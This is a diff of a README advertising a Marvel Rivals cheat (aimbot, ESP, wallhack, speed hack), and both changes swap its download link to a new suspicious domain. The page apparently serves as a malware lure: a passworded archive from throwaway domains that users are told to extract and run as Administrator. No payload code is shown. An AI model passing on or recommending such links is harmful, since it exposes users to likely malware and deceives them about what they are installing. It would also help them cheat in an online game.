@@ -6,7 +6,7 @@ Marvel Rivals hack with aimbot, ESP, wallhack, no-recoil, speed hack, hero unloc
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular external tools for Unreal Engine 5 hero shooters.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Marvel Rivals.
 4. Run the hack **as Administrator**.
